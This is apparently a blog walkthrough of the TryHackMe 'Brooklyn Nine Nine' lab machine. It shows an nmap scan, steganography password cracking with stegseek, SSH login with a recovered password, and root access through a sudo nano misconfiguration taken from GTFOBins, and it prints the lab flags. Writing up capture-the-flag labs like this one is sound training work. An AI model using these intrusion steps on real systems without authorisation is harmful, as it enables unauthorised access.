# NOTE: This was a blog from *vipin.xyz* see [this](https://www.vipin.xyz/blog/archive)

# Brooklyn Nine Nine | A Refresher

A machine to get me back into the THM flow!

Released: 2024-06-29


## Foreword

It's been a hot minute since I've done a THM machine, let's get back into the flow with an easy machine!

## NMAP

```bash
┌──(vipin㉿vipkali)-[~]
└─$ sudo nmap -sS -sV 10.10.224.179
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-18 02:29 EDT
Nmap scan report for 10.10.224.179
Host is up (1.4s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds
```

- An NMAP scan helps us understand our *attack surface*

> [What is an attack surface](https://letmegooglethat.com/?q=what+is+an+attack+surface)

- Since ***HTTP*** is available, let's check if there is a webpage.

## Enum & Exploit to User Flag

![homepage](blog/brooklyn99/homepage.png 'Fig.1')
<div style={{ textAlign: 'center' }}>
  <small>Fig.1</small>
</div>

- The homepage just seems to be an image from the *Brooklyn Nine Nine* show.


![source](blog/brooklyn99/source.png 'Fig.2')
<div style={{ textAlign: 'center' }}>
  <small>Fig.2 *Burp Pro*</small>
</div>

> `<!-- Have you ever heard of steganography? -->`

- That's an interesting comment, this seems to be a lead. We can use ***Aperisolve*** on the image to see if there is anything hidden in the image.

![steg image](blog/brooklyn99/steghide.png 'Fig.3')
<div style={{ textAlign: 'center' }}>
  <small>Fig.3 *AperiSolve*</small>
</div>

- ***Steghide*** didn't output anything nor did any of the other tools. I have a feeling I need to guess the StegHide password...

```bash
┌──(vipin㉿vipkali)-[~]
└─$ stegseek --crack /home/vipin/Downloads/brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
                                                           
┌──(vipin㉿vipkali)-[~]
└─$ cat brooklyn99.jpg.out 
Holts Password:
fluffydog12@ninenine

Enjoy!!
```

- **OH LORDY LORD!**, that was easy... 

```bash
┌──(vipin㉿vipkali)-[~]
└─$ ssh holt@10.10.118.249
The authenticity of host '10.10.118.249 (10.10.118.249)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.118.249' (ED25519) to the list of known hosts.
holt@10.10.118.249's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

## Rooting the machine!

- A good start to ***Priv-Esc*** is with `sudo -l`. This command pretty much list's what you can run as sudo.

```bash
holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

- Following [**GTFObins**](https://gtfobins.github.io/gtfobins/nano/#shell) method to get *root*, this happens...

![root](blog/brooklyn99/gtfobins_root.png 'Fig.4')
<div style={{ textAlign: 'center' }}>
  <small>Fig.4 *GTFObins*</small>
</div>

- There it is, the mighty `#`. Once you see that in your terminal, you have officially rooted this machine!

```bash
# whoami
root
# cd /root ; ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

### MACHINE PWN'ED 😎

